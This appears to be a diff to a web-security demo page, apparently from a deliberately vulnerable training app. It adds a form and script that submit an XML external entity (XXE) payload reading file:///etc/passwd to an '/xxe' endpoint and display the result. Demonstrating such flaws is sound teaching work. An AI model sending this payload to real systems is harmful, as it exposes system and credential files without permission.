@@ -84,16 +84,22 @@
                                 <div class="col-md-12">
                                     <textarea id="xxe-area" class="form-control" style="height: 200px">
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM
-  "file:///home/turbulence6th/password.txt">
+<!DOCTYPE xxe [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<foo>
+<human>
   &xxe;
-</foo></textarea>
+</human></textarea>
                                 </div>
                             </div>
+
+                            <div class="form-group">
+                                <div class="col-md-12">
+                                    <textarea id="xxe-info" class="form-control" style="height: 200px">
+                                    </textarea>
+                                </div>
+                            </div>
+                            <button type="button" id="xxe-submit" class="btn btn-default">Submit</button>
                         </fieldset>
                     </form>
                 </div>
@@ -169,6 +175,31 @@
         });
 
         document.getElementById("search-submit").onclick = searchClick;
+
+        /**
+         * XXE
+         */
+        let xxeClick = () => {
+            let formData = new FormData();
+            formData.append('xml', document.getElementById("xxe-area").value);
+
+            fetch("/xxe", {
+                body: formData,
+                method: "post"
+            }).then(response => {
+                return response.text();
+            }).then(response => {
+                document.getElementById("xxe-info").innerText = response;
+            });
+        };
+
+        document.getElementById("xxe-form").addEventListener("keyup", function(event) {
+            if (event.key === 'Enter') {
+                xxeClick();
+            }
+        });
+
+        document.getElementById("xxe-submit").onclick = xxeClick;
 
     </script>
 </body>
